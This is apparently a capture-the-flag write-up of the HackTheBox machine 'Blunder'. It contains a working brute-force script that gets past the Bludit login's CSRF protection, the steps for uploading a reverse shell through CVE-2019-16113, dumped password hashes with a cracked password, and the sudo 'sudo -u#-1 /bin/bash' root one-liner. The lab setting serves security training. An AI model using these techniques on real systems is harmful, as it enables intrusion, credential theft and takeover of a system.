# Blunder - HackTheBox WriteUp

![info](/images/blunder/info.png)
## Enumeration & Information Gathering
 
#### Scanning 

**NMAP:**
```
root@kali:~# nmap -T4 -p0-65535 10.10.10.191
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-31 21:00 EEST
Nmap scan report for 10.10.10.191
Host is up (0.058s latency).
Not shown: 65534 filtered ports
PORT   STATE  SERVICE
21/tcp closed ftp
80/tcp open   http
```

#### Service Enumeration 

**HTTP (80):**

**Gobuster Results:**
```

root@kali:~/pwn_share/Machines/Blunder# gobuster dir -u http://10.10.10.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,php," -o my_go.txt

http://10.10.10.191/about (Status: 200) [Size: 3280]
http://10.10.10.191/0 (Status: 200) [Size: 7561]
http://10.10.10.191/admin (Status: 301) [Size: 0]
http://10.10.10.191/install.php (Status: 200) [Size: 30]
http://10.10.10.191/robots.txt (Status: 200) [Size: 22]
http://10.10.10.191/todo.txt (Status: 200) [Size: 118]
http://10.10.10.191/usb (Status: 200) [Size: 3959]
http://10.10.10.191/LICENSE (Status: 200) [Size: 1083]

```
Visiting /install.php discloses a potential CMS "Bludit"

![bludit](/images/blunder/bludit.png)

Checking /LICENSE

![license](/images/blunder/license.png)

Googling the copyright details leads us to the creator's github page.

And one of the repositories in the bludit documentation

https://github.com/dignajar/bludit-documentation

Checking /todo.txt the following notes are discovered:

```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

From this, it can be assumed that ther is a user "fergus"

![todo](/images/blunder/todo.png)

/admin is the login page, and when viewing the page source, it potentially discloses the version of bludit as 3.9.2

![version](/images/blunder/version.png)

Searching n google and searchsploit for bludit exploits leading the following 

```
Shellcodes: No Result
root@kali:~/pwn_share/Machines/Blunder# searchsploit bludit
--------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                       |  Path
                                                                     | (/usr/share/exploitdb/)
--------------------------------------------------------------------- ----------------------------------------
Bludit - Directory Traversal Image File Upload (Metasploit)          | exploits/php/remote/47699.rb
bludit Pages Editor 3.0.0 - Arbitrary File Upload                    | exploits/php/webapps/46060.txt
--------------------------------------------------------------------- ----------------------------------------

```

Since the server is running version 3.9.2 the remaining exploit to be tried is the "Directory Traversal Image File Upload", however this requires a username and passowrd

Bludit's default admin username is "admin" according to documentation.

Bruteforcing could be an option, however, the server has some protection against this

https://github.com/bludit/documentation-english/blob/master/pages/security/brute-force-protection/index.md

```
private $dbFields = array(
    'minutesBlocked'=>5,
    'numberFailuresAllowed'=>10,
    'blackList'=>array()
);
```
With the default settings an attacker would be blacklisted after 10 failed attempts.


## Exploitation 
After enumerating more and not findnig a way in, this resulted to bruteforcing the web application.

It's always a good idea to start with a custom wordlist generated from the website

```cewl http://10.10.10.191/ > cewl_out.txt```

Next, bruteforcing with the tradional tools would not work easily due to the random csrf token generated each time the login page is visited.

This can be solved by making a get request first and grabbing the csrf token and then making the post request with the login details and the crsf token obtained from the first get request.

**blunder.py**
```
```
Using cewl to create a wordlist

Write a python script to bruteforce login with cewl output. 

The IP is set to 127.0.0.1 with burp proxy configured to intercept and forward the traffic to 10.10.10.191. With this we can inspect the traffic in burp also.


Csrf is handled by using sessions and making a get request before posting the form data with the obtained token

blunder.py
```
import requests
from bs4 import BeautifulSoup
import re

ip = '127.0.0.1'
url = 'http://' + ip +'/admin/login'
re_csrf = 'value=("(.*?)")'

req = requests.session()

#lines = open('cewl_out.txt','r')
lines = open('p.txt','r')
for password in lines:

    res = req.get(url)

# print(res.content)
    html_doc = res.content

    soup = BeautifulSoup(html_doc, 'html.parser')

    csrf_text = soup.find(id="jstokenCSRF")

    csrf = re.findall(re_csrf, str(csrf_text))[0][1]

    #print(csrf)

    login = {'tokenCSRF' : csrf, 'username' : 'fergus', 'password' : password[:-1], 'save' : ''}

    r = req.post(url,data=login)
    #print(r.content)
    #print(csrf)

    html_doc2 = r.content
    post_soup = BeautifulSoup(html_doc2, 'html.parser')
    title = post_soup.title
    if "Dashboard" in str(title):
        print("Valid Login %s:%s" % ("fergus", password[:-1]))
    else:
        print("Failed %s:%s" % ("fergus", password[:-1]))
```

![burp_pass](/images/blunder/burp_pass.png)

#### Foothold 
Since the password has been discovered, it's time to move on to exploitong the CMS.

If you are fine with automated exploits, one could easily use  metasploit for this, however, I prefer manually exploiting targets whenever possible.

With that said, "googling bludit exploit github" retuned results where the "**CVE-2019-16113**: Directory Traversal Image Upload Exploit" was reported and also had the steps to reproduce

Reproducing the steps form the pull request:

1. Upload an image, intercept and edit to a php reverse shell "rev.php" (ignore mime type errors) 
   https://github.com/pentestmonkey/php-reverse-shell is a good source

   ![rev_php](/images/blunder/rev_php.png)

2. Upload .htaccess adding "RewriteEngine Off" as the content (ignore mime type errors)
3. Set up netcat listener 
4. ```nc -lnvp 443```   
5. Acess shell at http://10.10.10.191/bl-content/tmp/rev.php

A shell is received on the listener as user **www-data**

![foothold](/images/blunder/foothold.png)

#### Post Exploitation Enumeration 

The shell can be upgraded as usuall using:

```
$ which python
/usr/bin/python
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@blunder:/$ ^Z
[1]+  Stopped                 nc -lnvp 443
root@kali:/var/www/html/pub# stty raw -echo
fg
enter
enter
```
Moving on to enumeration:

on the / directory there is an ftp directory, which is interesting since it was also mention in the first note.

**note.txt:**

```
www-data@blunder:/ftp$ cat note.txt 
Hey Sophie
I've left the thing you're looking for in here for you to continue my work
when I leave. The other thing is the same although Ive left it elsewhere too.

Its using the method we talked about; dont leave it on a post-it note this time!

Thanks
Shaun
```

Using netcat to pull the rest of the files (so the pdf can be opened in desktop mode)

![nc_pil](/images/blunder/nc_pil.png)


Next, enumerating files and folders in /var/www/ there is the older version of Bludit which we exploited and the newer verion as well.

Checking out interesting files here, espacially the databases directory in bl-content:
```
www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ cat users.php 
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
    "fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
}
```

Attempting to crack both hashes with crackstation.net failed.

Movin on to the later version:


```
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php 
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

It's noticeable that this file doesn't have a salt value like the previous ones did and the password may be crackable.

Trying this on crackstation.net. 

![crack_hugo](/images/blundit/crack_hugo.png)

The password is cracked as "**Password120**"

![blu10_pass](/images/blundit/blu10_pass.png)


At this point the yser flag can be read.

![user](/images/blundit/user.png)


## Privilege Escalation 

Escalating to root on this machine is 1 minute away from root if aware of the 

sudo 1.8 vulnerability which is essentialliay this oneliner:

> sudo -u#-1 /bin/bash

The exploit can be found in more details on exploitdb:

https://www.exploit-db.com/exploits/47502

Checking the version of sudo on the machine confirms it's running a vunerable version, therefore the exploit is used

![root.png](/images/blunder/root.png)

Conclusion:

This machine was straightforward, nice and rewarding at it's difficulty rating.

Though one might feel like or could guess the password for the "fergus" user, I believe scripting the process or reading and modifying an existing script provides a learning experience for begineers.

Getting the user flag reinforces enumeration as a very important process in pentesting and the root exploit involves very little research.

Overall the machine teaches the importance of updating oudated software.

Till next time!



